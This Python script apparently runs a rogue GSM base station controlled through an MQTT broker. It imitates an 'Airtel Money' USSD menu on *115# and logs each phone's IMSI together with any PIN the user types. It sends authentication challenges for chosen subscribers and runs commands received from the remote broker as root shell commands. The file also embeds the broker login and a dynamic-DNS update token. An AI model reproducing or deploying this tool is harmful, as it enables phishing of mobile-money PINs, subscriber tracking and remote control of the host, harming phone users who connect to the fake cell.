import paho.mqtt.client as mqtt
import time
import asyncio
import json
import subprocess
import telnetlib
import sqlite3
import sys
import urllib.request
import os
import HLR

# MQTT broker credentials and settings
LOCAL_ADDR, LOCAL_PORT = 'localhost',8888
DB_PATH="/var/lib/osmocom/hlr.sqlite3"
broker_address = '3a4f7d6b0cd1473681d6c9bdfa569318.s2.eu.hivemq.cloud'
mqtt_port = 8883
ws_port = 8884
username = 'onverantwoordelik'
password = 'asdf8090ABC!!'
use_websockets = False  # Set to False for MQTT over SSL/TLS (port 8883)
client_id="nitb"
peer_id="osmobb"
sub=F'cheapray/{client_id}'
pub=F'cheapray/{peer_id}'
broker_timeout=3600

MESSAGE = {
    'type':'cmd',
    'msg':'',
    'is_res': False,
    'is_json': False
}

services = "osmo-nitb.service osmo-trx-lms.service osmo-bts-trx.service"
d_cmds = {'start-nib':  F'systemctl restart {services}','stop-nib': F'systemctl stop {services}'}

def sdr_check():
    p = subprocess.Popen(['LimeUtil', '--find'], stdout=subprocess.PIPE)
    output, err = p.communicate()
    rc = p.returncode

    if b"LimeSDR" in output:
        return F"[+] Found device: {output.decode()}"
    else:
        return "[-] Not devices found, exiting..."
    
def get_ip():
    try:
        with urllib.request.urlopen('https://api.ipify.org?format=json') as response:
            data = response.read().decode('utf-8')
            # The response is in JSON format, so we need to parse it to extract the IP address.
            import json
            ip_data = json.loads(data)
            return ip_data['ip']
    except Exception as e:
        return F"Error: {e}"


def render_menu(inputed):
    menu = ""
    options = json.loads(open('airtel-money.json', 'r').read())
    print(F"User inputed: {inputed}")

    #navigate to level
    if len(inputed) > 1:
        try:
            inputed = inputed[1:]
            for option in inputed:
                options = options[int(option)-1]['options']
        except:
            pass
    
    if options:
        for index, option in enumerate(options):
            try:
                menu += F"{index+1}.{option['label']}\r"
            except:
                pass

            try:
                menu += F"{option['text']}\r"
            except:
                pass

            
            if type(option) == str:
                menu += F"\r\n{option}"
    return menu


async def handle_ussd(data):
    dat_len = len(data['text'])
    resp = None
    #create new ussd session
    if data['text'] == '*115#' and data['opcode'] == '59':
        ussd_sessions[data['imsi']] = {'current_page':'0'}
        resp = F"Welcome to Airtel Money.\r{render_menu(ussd_sessions[data['imsi']]['current_page'])}"
    elif data['opcode'] == '59':
        if data['imsi'] in ussd_sessions:
            ussd_sessions.pop(data['imsi'])
        resp = 'External Application Down'
    else:
        if data['imsi'] in ussd_sessions.keys():
            if data['text'] == "*" and len(ussd_sessions[data['imsi']]['current_page']) >= 2:
                ussd_sessions[data['imsi']]['current_page'] = ussd_sessions[data['imsi']]['current_page'][:-1]
            elif dat_len == 1:
                ussd_sessions[data['imsi']]['current_page'] += data['text']
            elif dat_len == 4:
                print(F"IMSI:{data['imsi']!r} | PIN:{data['text']!r}")
            elif dat_len >= 9:
                resp = data['text']
            if not resp:
                resp = render_menu(ussd_sessions[data['imsi']]['current_page'])
        else:
            resp = 'External Application Down'
    resp = resp.encode('ascii')
    mlen = len(resp)
    cuttof=131
    if mlen > cuttof:
        resp = resp[:cuttof]
    print(F"HAS {len(resp)} Bytes")
    return resp


def handle_cmd(message, client):
    try:
        conn = telnetlib.Telnet("127.0.0.1", 4242)
        conn.read_until(b"OpenBSC> ")

        command = json.loads(message)
        if command['rand']:
            conn.write(F"subscriber imsi {command['imsi']} send-auth {command['rand']}\n".encode())
            res = conn.read_until(b"OpenBSC> ")
            print(res.decode())
            conn.close()
            return True
    except:
        return False

def execute_command(command):
    
    print(F'executing {command}')
    global m_cmds
    if command in m_cmds:
        return m_cmds[command]()
    elif command in d_cmds:
        command = d_cmds[command]
    else:
        pass
    
    res = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return F"$: {res.stdout.strip()}"
    #except subprocess.CalledProcessError as e:
    #    return f"Error: {e}"

# Define callback functions
def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("Connected to MQTT broker")
        client.subscribe(sub)  # Replace with the desired topic to subscribe to
        MESSAGE['msg'] = F'{peer_id}?'
        message = json.dumps(MESSAGE)
        client.publish(pub, message)
    else:
        print("Connection failed")

def on_message(client, userdata, message):
    msg, topic = message.payload.decode(), message.topic
    
    msgg = json.loads(msg)
    if msgg['type'] == 'usr':
        if not msgg['is_res']:
            msgg['msg'] = execute_command(msgg['msg'])
            msgg['is_res'] = True
            client.publish(pub, json.dumps(msgg))
        else:
            print(msgg['msg'])
    elif msgg['type'] =='cmd' and msgg['is_json']:
        msgg['msg'] = handle_cmd(msgg['msg'], client)
        msgg['is_res'] = True
        client.publish(pub, json.dumps(msgg))
        
    else:
        print('unhandled')
    
    print(f"RX: {msg!r}\nTopic: {topic!r}\n")
    
def on_disconnect(client, userdata, rc):
    pass

def get_client():
    # Create a client instance
    client = mqtt.Client(client_id=client_id)  # Replace with your desired client_id

    # Set credentials
    client.username_pw_set(username, password)

    # Assign the callbacks to the client
    client.on_connect = on_connect
    client.on_message = on_message
    client.on_disconnect = on_disconnect
    client.reconnect_delay_set(min_delay=1, max_delay=60)

    while True:
        try:
            if use_websockets:
                # Connect to the MQTT broker using WebSockets
                client.ws_set_options(path="/mqtt")
                client.connect(broker_address, ws_port, keepalive=broker_timeout)
                print('connected')
            else:
                # Connect to the MQTT broker using SSL/TLS
                client.tls_set()
                client.connect(broker_address, mqtt_port, keepalive=broker_timeout)
                print('connected')
                break
        except KeyboardInterrupt:
            # Disconnect and stop the network loop when manually interrupted
            client.disconnect()
            print("Disconnected from the MQTT broker")

    return client

async def handle_client(reader, writer):

    try:
        while True:
            data = await reader.read(240)
            if not data:
                break

            data = data.decode().strip()
            print(data)
            if 'name-me' in data:
                conns['telnet'] = [reader, writer]
            elif 'ussd' in data:
                resp = await handle_ussd(json.loads(data))
                writer.write(resp)
                await writer.drain()
            else:
                message = MESSAGE
                if 'nitb' in data or 'osmobb':
                    message['type'] = 'cmd'
                    message['is_json'] = True
                else:
                    message['type'] = 'usr'
                message['msg'] = data
                client.publish(pub, json.dumps(message))
                
    except asyncio.CancelledError:
        pass
    finally:
        writer.close()
        await writer.wait_closed()
        print("Client disconnected.")

async def connect(client):
    res = await loop.run_in_executor(None, client.loop_forever)
    return res

async def local_server(addr=LOCAL_ADDR, port=LOCAL_PORT):
    global ussd_sessions
    ussd_sessions = {}
    server = await asyncio.start_server(handle_client, addr, port)
    print(F"WebSocket server started and listening on {addr}:{port}")
    try:
        await server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.close()
        await server.wait_closed()
        print("WebSocket-like server closed.")

def check_users(db_path=DB_PATH,db=None):

    if os.path.exists("/var/lib/osmocom/hlr.sqlite3"):
        if not db:
            db = HLR.Database(db_path)
        return db.get_subscribers()
    else:
        return 'no db in path'


async def update_ip():
    while True:
        try:
            with urllib.request.urlopen('https://freedns.afraid.org/dynamic/update.php?RjJlWWhsUjZPbXpNaW1CVWNLUXNJb0luOjIxNzUyMTI5') as response:
                data = response.read().decode('utf-8')
                print(data)
        except Exception as e:
            pass
        await asyncio.sleep(30)

async def main():
    global client
    global conns
    global m_cmds 
    conns = {}
    m_cmds = {'get-ip':get_ip, 'users': check_users}
    client = get_client()
    tasks = [ local_server(),  connect(client), update_ip()]
    await asyncio.gather(*tasks)
    

if __name__ == '__main__':
    if not os.geteuid() == 0:
        print("Run as root!")
        exit(1)
    loop = asyncio.get_event_loop()
    try:
        # Run the main function that includes the async tasks
        loop.run_until_complete(main())
    finally:
        # Close the event loop at the end
        loop.close()
     
    